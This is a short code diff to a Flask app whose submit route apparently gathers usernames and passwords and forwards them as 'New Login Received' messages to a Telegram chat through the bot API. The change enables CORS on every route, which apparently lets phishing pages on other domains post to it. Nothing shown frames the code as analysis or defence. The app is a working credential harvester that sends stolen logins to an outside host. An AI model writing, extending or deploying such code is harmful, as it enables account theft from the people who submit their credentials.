@@ -1,9 +1,11 @@
 
 from flask import Flask, request, jsonify
+from flask_cors import CORS
 import requests
 import os
 
 app = Flask(__name__)
+CORS(app)  # Enable CORS for all routes
 
 # Get bot token from environment variable
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -24,7 +26,7 @@ def submit():
 
     message = f"🔐 New Login Received\n👤 Username: {username}\n🔑 Password: {password}"
 
-    # Send message to original Telegram user
+    # Send message to Telegram
     response = requests.post(TELEGRAM_API, json={
         "chat_id": chat_id,
         "text": message
